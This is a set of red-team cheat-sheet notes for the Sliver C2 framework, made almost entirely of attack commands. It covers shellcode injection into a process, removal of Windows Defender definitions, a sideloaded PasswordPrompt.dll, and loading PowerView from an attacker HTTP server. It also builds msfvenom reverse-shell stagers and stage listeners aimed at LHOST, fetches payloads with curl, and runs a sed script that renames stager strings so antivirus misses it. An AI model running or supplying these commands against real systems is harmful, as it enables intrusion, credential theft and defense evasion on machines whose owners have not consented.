
```
run shellcode in sliver
execute-shellcode -p 2760 /tmp/payload.bin

removes the av signatures
execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

run sharphound
sharp-hound-4 -- '-c all,GPOLocalGroup'

sideload (sliver is using donut)
https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/
sideload --entry-point RunMyCode --process "C:\Program Files (x86)\Microsoft\Edge\Application\109.0.1518.61\identity_helper.exe" /mnt/smb/PasswordPrompt.dll 3

sharpsh
sharpsh -- '-u http://192.168.56.1:9090/PowerView.ps1 -e -c RwBlAHQALQBEAG8AbQBhAGkAbgBHAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgA='
```

```
https://www.youtube.com/watch?v=3uHNyTZvbqs


The 4 Stager Steps. MTLS Example

mtls -l 9002

profile new --mtls LHOST:9002 -l -f shellcode new_profile_mtls
profile new beacon --mtls LHOST:9002 -l -f shellcode new_profile_mtls

stage-listener -u http://LHOST:4900 -p  new_profile_mtls
stage-listener -u http://LHOST:4900 -p  new_profile_mtls

msfvenom -p windows/x64/custom/reverse_tcp lhost=LHOST lport=4900 -f exe -o tcp.exe
msfvenom -p windows/x64/custom/reverse_winhttp lhost=LHOST lport=4900 LURI=/path.woff -f exe -o http.exe

Download .bat script code

python -m http.server 80

echo off
set file=%1
shift
curl.exe http://LHOST-IP/%file% -o %file%

cmd.exe
.\dl_file.bat python_webserver_file.exe

Demo 1 Commands

mtls -l 9900
profiles new --mtls LHOST:9900 -l -f shellcode m_shellcode

stage-listener -u http://LHOST:9443 -p m_shellcode
stage-listener -u tcp://LHOST:1234 -p m_shellcode

msfvenom -p windows/x64/custom/reverse_tcp lhost=LHOST lport=1234 -f exe -o tcp.exe
msfvenom -p windows/x64/custom/reverse_winhttp lhost=LHOST lport=9443 LURI=/path.woff -f exe -o http.exe

generate stager --lhost LHOST --lport 9443 --arch amd64 --format raw --save /tmp

** Custom Tool Fill the Blank... Whatever Go out and Play!
 Find what works and what doesn't

Demo 2 Commands. Reusing the Listeners from Demo 1

Default Csharp Stager Code
https://sliver.sh/docs?name=Stagers

mono-csc stager.cs
ThreatCheck.exe -f /path/to/stager.exe

cat remove_bad_strings.sh
#!/bin/bash
stage_code=$1
sed -e 's/SliverStager/FirstAct/g' $stage_code -i
sed -e 's/Stager/Cage/g' $stage_code -i
sed -e 's/DownloadAndExecute/NewTVShow/g' $stage_code -i

bash remove_bad_strings.sh default_stager.cs

Demo 3 Commands. Reusing the Csharp custom stager

http -l 9001
profiles new beacon --http http://LHOST:9001 -f shellcode http_win
stage-listener --profile http_win --url http://LHOST:4400

Reuse Csharp Custom Stager for HTTP stage-listener type just swap out the LPORT

```
